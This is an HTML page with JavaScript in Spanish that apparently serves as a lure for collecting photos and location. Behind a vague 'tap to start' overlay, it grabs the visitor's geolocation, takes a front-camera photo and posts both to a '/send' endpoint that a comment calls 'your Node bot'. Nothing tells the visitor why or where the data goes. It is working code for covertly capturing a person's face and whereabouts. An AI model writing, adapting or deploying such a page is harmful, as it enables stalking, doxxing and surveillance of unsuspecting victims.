<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captura Automática</title>
    <style>
        body { margin: 0; background: #000; overflow: hidden; font-family: sans-serif; }
        video { width: 100%; height: 100%; object-fit: cover; }
        #status { position: absolute; bottom: 20px; left: 0; width: 100%; text-align: center; color: white; background: rgba(0,0,0,0.5); padding: 10px; }
        /* Botón invisible para activar audio/video en móviles */
        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display:none;"></canvas>
    
    <!-- Mensaje inicial -->
    <div id="overlay" onclick="iniciar()">
        <h1 style="color:white; text-align:center; margin-top:40%;">Toca para comenzar</h1>
    </div>

    <div id="status">Esperando...</div>

    <script>
        let lat = null;
        let lng = null;
        let videoStream = null;

        function iniciar() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('status').innerText = "Capturando...";

            // 1. Obtener Ubicación
            navigator.geolocation.getCurrentPosition(position => {
                lat = position.coords.latitude;
                lng = position.coords.longitude;
                console.log("Ubicación obtenida:", lat, lng);
                
                // Si ya tenemos la cámara, capturamos ahora
                if(videoStream) tomarFoto();
            }, error => {
                document.getElementById('status').innerText = "Error de ubicación";
                lat = "N/A";
                lng = "N/A";
                if(videoStream) tomarFoto();
            });

            // 2. Iniciar Cámara Frontal
            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
                audio: false 
            }).then(stream => {
                videoStream = stream;
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Esperar a que el video tenga metadata para capturar
                video.onloadedmetadata = () => {
                    setTimeout(tomarFoto, 1000); // Pequeño delay para asegurar enfoque
                };
            }).catch(err => {
                document.getElementById('status').innerText = "Error cámara: " + err.message;
            });
        }

        function tomarFoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const status = document.getElementById('status');

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convertir a Base64
            const dataUrl = canvas.toDataURL('image/jpeg', 0.7);

            status.innerText = "Enviando datos...";

            // 3. Enviar al servidor (Tu bot de Node)
            fetch('/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `image=${encodeURIComponent(dataUrl)}&lat=${lat}&lng=${lng}`
            })
            .then(response => {
                status.innerText = "¡Listo! Datos enviados.";
                // Opcional: Redirigir o mostrar mensaje final
                setTimeout(() => { alert("Captura enviada con éxito."); window.location.reload(); }, 2000);
            })
            .catch(error => {
                status.innerText = "Error al enviar.";
                console.error(error);
            });
        }
    </script>
</body>
</html>
